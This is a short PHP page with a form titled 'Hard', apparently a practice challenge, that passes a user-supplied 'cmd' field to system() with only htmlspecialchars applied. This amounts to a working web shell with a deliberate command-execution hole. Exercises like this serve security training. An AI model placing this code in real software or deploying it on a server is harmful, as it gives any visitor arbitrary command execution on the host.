<?php
	if (isset($_POST['submit'])&&isset($_POST['cmd'])) {
		system(htmlspecialchars($_POST['cmd']));
	}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Hard</title>
</head>
<body>
	<form method="POST">
		<input type="text" name="cmd">
		<input type="submit" name="submit" value="submit">
	</form>
</body>
</html>